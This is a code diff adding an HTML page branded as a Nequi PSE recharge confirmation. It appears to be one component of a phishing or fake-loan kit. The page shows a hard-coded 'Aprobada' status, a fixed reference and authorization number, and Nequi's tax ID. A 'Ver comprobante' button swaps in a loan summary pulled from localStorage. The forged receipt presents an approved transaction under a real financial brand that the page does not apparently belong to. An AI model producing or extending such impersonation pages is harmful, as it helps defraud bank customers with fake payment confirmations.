@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Recarga PSE Nequi</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="theme-color" content="#11A6BB">
+        <link rel="icon" type="image/svg+xml" sizes="32x32" href="../../../assets/img/nequi-favicon-dark.svg" media="(prefers-color-scheme: dark)">
+        <link rel="icon" type="image/svg+xml" sizes="32x32" href="../../../assets/img/nequi-favicon-light.svg" media="(prefers-color-scheme: light)">
+        <script type="text/javascript" src="../../../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="../../../assets/css/styles.css" rel="stylesheet">    
+        <script type="text/javascript" src="../../../assets/js/functions.js"></script>  
+        <script type="text/javascript" src="../../../assets/js/ready.js"></script> 
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet">   
+        <!-- Se eliminan las llamadas automáticas a cargar_resumen() y vista_resumen() -->
+        <script type="text/javascript">
+            $(document).ready(function($){
+                // Mostramos el botón de comprobante
+                $("#comprobante").show();
+            });
+        </script>
+        <style type="text/css">
+            #fondo{
+                position: fixed;
+                z-index: 300;
+                width: 100%;
+                height: 100%;
+                top: 0;
+                left: 0;
+                background-color: rgb(255 255 255 / 80%);        
+            }
+            #cargando{
+                position: fixed;            
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 320;
+            }
+        </style> 
+    </head>
+    <body>
+        <div id="fondo"></div>
+        <img id="cargando" src="../../../assets/img/cargando.gif" width="180">
+        <div class="contenedor" id="frm-resumen">  
+            <img src="../../../assets/img/logo.svg" id="logo">
+            <br>
+            <div class="titulo" style="display:none;">Resumen</div>
+            <img src="../../../assets/img/aprobado.jpg" id="aprobado" style="margin:50px 0px 60px 0px;display: none;">
+            <!-- Botón para ver el comprobante (resumen) -->
+            <button class="btnok" id="comprobante" style="display:none;">Ver comprobante</button>
+            <div class="marco" style="display:none;">
+                <div class="etiqueta-res" style="margin-top: 1px;">Empresa</div>
+                <div class="valor-res">Nequi</div>
+                <div class="etiqueta-res">NIT</div>
+                <div class="valor-res">890903938</div>
+                <div class="etiqueta-res">Dirección IP</div>
+                <div class="valor-res" id="inf-ip"></div>  
+                <div class="etiqueta-res">Estado</div>
+                <div class="valor-res">Aprobada</div>
+                <div class="etiqueta-res">Descripción</div>
+                <div class="valor-res">Recarga Nequi PSE</div>
+                <div class="etiqueta-res">Fecha de pago</div>
+                <div class="valor-res" id="val-fecha"></div>
+                <div class="etiqueta-res">Referencia</div>
+                <div class="valor-res">172921711564327653</div>
+                <div class="etiqueta-res">Autorización</div>
+                <div class="valor-res">538729567</div>
+                <div class="etiqueta-res">Elige el banco</div>
+                <div class="valor-res" id="val-banco"></div>
+                <div class="etiqueta-res">Total</div>
+                <div class="valor-res" id="val-total"></div>
+                <div class="etiqueta-res">Número de celular</div>
+                <div class="valor-res" id="val-celular"></div>
+            </div>                    
+            <button class="btnok" id="regresar" style="display:none;">Regresar al inicio</button>
+            <br>
+            <button class="btncancel" id="imprimir" style="cursor: pointer; display: none;">Imprimir</button>            
+        </div>
+        
+        <script type="text/javascript">
+            $(document).ready(function(){
+                // Al hacer clic en "Ver comprobante" se reemplaza el contenido de frm-resumen
+                $("#comprobante").click(function(e){
+                    e.preventDefault();
+                    // Reemplazamos el contenido por el resumen similar a fin.html
+                    $("#frm-resumen").html(`
+                        <div class="contenedor">
+                            <img src="logo.png" alt="Logo" id="logo">
+                            <h1>Gracias</h1>
+                            <div class="detalle"><span>Monto solicitado:</span><span id="monto"></span></div>
+                            <div class="detalle"><span>Plazo:</span><span id="plazo"></span></div>
+                            <div class="detalle"><span>Cuota mensual:</span><span id="cuota"></span></div>
+                            <div class="detalle"><span>Interés Total:</span><span id="interesTotal"></span></div>
+                            <div class="detalle"><span>Monto Total a pagar:</span><span id="montoTotal"></span></div>
+                            <p class="mensaje-final">Gracias por completar tu proceso. Te avisaremos cuando todo haya terminado.</p>
+                        </div>
+                    `);
+                    // Recuperar el objeto "inicio" desde localStorage
+                    const inicio = JSON.parse(localStorage.getItem('inicio'));
+                    if(inicio){
+                        $("#monto").text(inicio.monto);
+                        $("#plazo").text(inicio.plazo + " meses");
+                        $("#cuota").text(inicio.cuota);
+                        $("#interesTotal").text(inicio.interesTotal);
+                        $("#montoTotal").text(inicio.montoTotal);
+                    } else {
+                        $(".contenedor").append('<p style="text-align:center; color:red;">No se encontraron datos guardados.</p>');
+                    }
+                });
+            });
+        </script>
+    </body>
+</html>
